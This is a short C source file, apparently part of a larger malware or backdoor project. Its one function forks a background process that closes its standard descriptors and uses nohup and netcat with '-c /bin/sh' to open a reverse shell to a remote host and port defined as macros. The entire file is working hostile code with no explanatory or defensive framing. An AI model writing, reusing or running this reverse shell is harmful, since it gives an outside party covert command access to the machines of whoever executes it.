#include "lib.h"
#include "remote.h"

int	remote(void)
{
	pid_t pid;
	char *const para[] = {"/usr/bin/nohup",
		"/bin/nc", REMOTE_TARGET, REMOTE_PORT, "-c", "/bin/sh", REMOTE_EXEC,
			NULL};
	if ((pid = fork()) == 0)
	{
		close(0);
		close(1);
		close(2);
		execve(para[0], para, NULL);
	}
	return (pid < -1);
}
